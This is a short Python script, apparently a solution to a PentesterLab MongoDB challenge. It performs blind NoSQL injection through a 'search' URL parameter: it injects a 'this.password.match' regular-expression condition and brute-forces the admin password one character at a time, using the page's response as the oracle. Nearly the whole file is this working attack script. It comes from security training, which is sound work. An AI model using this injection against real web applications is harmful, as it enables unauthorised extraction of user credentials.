#!/bin/python3

#Script to solve Mongo 02 pentesterlab chall from essential badge

import urllib.request
import string
import pyfiglet

text = "It works"
text2 = "Here it is"
ascii_art = pyfiglet.figlet_format(text)
ascii_art2 = pyfiglet.figlet_format(text2)
URL="[CHANGE ME PLEASE]"

def check(passinject):
    url=URL+"?search=admin%27%26%26this.password.match(/"+passinject+"/)%00"
    print(url)
    resp = urllib.request.urlopen(url)
    data = resp.read()
    return ">admin<" in str(data)

CHARSET=list(string.ascii_letters+string.digits+"'!#&()+,-./:;<=>?@[\]^_`{}~'.")#kontuz kaleratu emagalduak "$%*"
password=""

while True:
    for c in CHARSET:
        print("Trying: "+c+" for "+password)
        test = password+c
        if check("^"+test+".*$"):
            password+=c
            print(password)
            print(ascii_art)
            break
        elif c ==CHARSET[-1]:
            print(password)
            print(ascii_art2)
            exit(0)
